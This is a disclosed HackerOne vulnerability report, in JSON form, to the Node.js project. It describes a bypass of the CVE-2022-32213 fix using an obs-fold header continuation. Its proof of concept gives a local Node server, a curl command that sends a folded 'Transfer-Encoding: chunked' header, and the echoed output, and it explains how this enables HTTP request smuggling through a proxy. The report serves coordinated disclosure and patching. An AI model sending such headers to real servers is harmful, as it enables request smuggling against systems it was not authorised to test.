{
  "id": 1630336,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjMwMzM2",
  "url": "https://hackerone.com/reports/1630336",
  "title": "CVE-2022-32213 bypass via obs-fold mechanic",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-07-07T17:14:53.932Z",
  "submitted_at": "2022-07-07T17:14:54.017Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haxatron1",
    "url": "/haxatron1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-32213"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-10-26T08:17:58.972Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:47.036Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\nThe fix for CVE-2022-32213 can be bypass using an obs-fold, which Node's http parser supports\n\n## Proof-Of-Concept\n`````\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"error while reading body: \" + err)\n}).on('data', (chunk) => {\n    body.push(chunk);\n}).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    response.on('error', (err) => {\n        response.end(\"error while sending response: \" + err)\n    });\n\n    response.end(\"Headers: \" + JSON.stringify(request.headers));\n  });\n}).listen(5000);\n\n`````\nSend the obs-fold via curl\n`````\ncurl -vv -H $'Transfer-Encoding: chunked\\r\\n abc' --data \"A\" http://127.0.0.1:5000\n`````\nSee that the server accepted the chunked request, and will incorrectly fold abc to the value of the Transfer-Encoding header. This is seen in the value of \"transfer-encoding\" as \"chunked abc\" in the printed headers.\n`````\nHeaders: {\"host\":\"127.0.0.1:5000\",\"user-agent\":\"curl/7.83.1\",\"accept\":\"*/*\",\"transfer-encoding\":\"chunked abc\",\"content-type\":\"application/x-www-form-urlencoded\"}\n`````\n\n## Impact\n\nIf nodejs HTTP module is used as a proxy, then it incorrectly parses the transfer-encoding header as indicative of chunked request, while folding the headers and hence forwarding `Transfer-Encoding: chunked abc` which is not a valid transfer-encoding header to the downstream server. As such this can lead to the  HTTP request smuggling as indicated by CVE-2022-32213.",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-10-26T08:17:47.123Z",
  "allow_singular_disclosure_after": -41062221.15802818,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "shreyaschavhan",
    "7odamoo",
    "shivammusic",
    "zyklonb",
    "garbonoti"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
